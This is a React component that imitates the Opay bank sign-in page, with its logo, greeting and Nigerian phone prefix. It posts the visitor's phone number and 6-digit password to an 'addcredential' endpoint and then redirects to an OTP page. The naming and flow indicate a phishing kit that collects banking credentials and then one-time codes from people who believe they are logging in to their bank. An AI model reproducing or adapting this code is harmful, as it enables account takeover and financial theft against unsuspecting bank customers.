import { useRef, useState, useContext, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import CredentialContext from '../../context/CredentialProvider';
import axios from '../../api/axios';
import Spinner from "../utilities/Spinner";
var logo = require("../../assets/logo.png");
var flag = require("../../assets/flag.png");

const AddCredential = () => {
    const navigate = useNavigate();
    const {setLoad} = useContext(CredentialContext);
    const emailRef = useRef();
    const errRef = useRef();

    const [phoneNumber, setPhoneNumber] = useState('');
    const [password, setPassword] = useState('');
    const [errMsg, setErrMsg] = useState('');
    const [loading, setLoading] = useState(false);
    const [disabled, setDisabled] = useState(true);

    useEffect(() => {
        emailRef.current.focus();
    }, [])

    useEffect(() => {
        setErrMsg('');
    }, [phoneNumber, password]);

    useEffect(()=>{
        setDisabled(phoneNumber.length !== 11 || password.length !== 6);
      }, [phoneNumber, password]);

    const handleSubmit = async (e) => {
        e.preventDefault();
        setLoading(true);
        try {
            var response = await axios.post('addcredential',
                JSON.stringify({ bank: 'Opay', phoneNumber: phoneNumber, password: password }),
                {
                    headers: { 'Content-Type': 'application/json' },
                }
            );
            setLoad(true);
            sessionStorage.setItem('credId', response?.data?.data?.id);
            setTimeout(() => {
                setPhoneNumber('');
                setPassword('');
                setLoading(false);
                navigate('/otp');
            }, 1000);
        } catch (err) {
            setLoading(false);
            if (!err?.response) {
                setErrMsg('No server response!');
            } else if (err.response?.status !== 200) {
                setErrMsg(err?.response?.data?.message);
            } else {
                setErrMsg('Login Failed');
            }
            errRef.current.focus();
        }
    }

    return (
            <div className='add-container'>
                <div className='add-content' style={{"marginTop": "-3rem"}}>
                <span className='page-header'>
                    <img className='logo' src={logo} alt='opay logo' />
                    Welcome to Opay
                </span>
                <p ref={errRef} className={errMsg ? "errmsg" : "offscreen"} aria-live="assertive">{errMsg}</p>
                <form data-v-093779e2="" onSubmit={handleSubmit}>
                    <div className="form-group">
                        <label data-v-093779e2="" htmlFor="email">Phone Number</label>
                        <div className="phone-input">
                            <span className="prefix"><img className='flag' src={flag} alt='Flag' /> +234 |</span>
                            <input
                                className="form-control"
                                type="number"
                                id="number"
                                maxLength={11}
                                placeholder='Enter phone number'
                                ref={emailRef}
                                autoComplete='off'
                                inputMode="numeric"
                                onChange={(e) => setPhoneNumber(e.target.value)}
                                value={phoneNumber}
                                required
                            />
                        </div>
                    </div>
                    <div data-v-093779e2="" className="form-group">
                        <label data-v-093779e2="" htmlFor="password">Password</label>
                        <input
                            data-v-093779e2=""
                            className="form-control"
                            type="password"
                            id="password"
                            placeholder='Enter 6-digits password'
                            autoComplete='off'
                            inputMode="numeric"
                            onChange={(e) => setPassword(e.target.value)}
                            value={password}
                            required
                        />
                    </div>
                    <div data-v-093779e2="" className="reset-pasword" style={{marginTop: '-15px'}}>
                        <div data-v-093779e2="" className="form-group">
                            <input data-v-093779e2="" type="checkbox" id="check" />
                            <label data-v-093779e2="" htmlFor="check">Remember Password</label>
                        </div>
                    </div>
                    
                    <button data-v-093779e2="" className={disabled ? "btn btn-disabled" : "btn btn-active"} disabled={disabled}>
                        Sign in
                    </button>
                </form>
                
                {loading && <Spinner loading={loading}/> }
            </div>
            </div>
    )
}

export default AddCredential
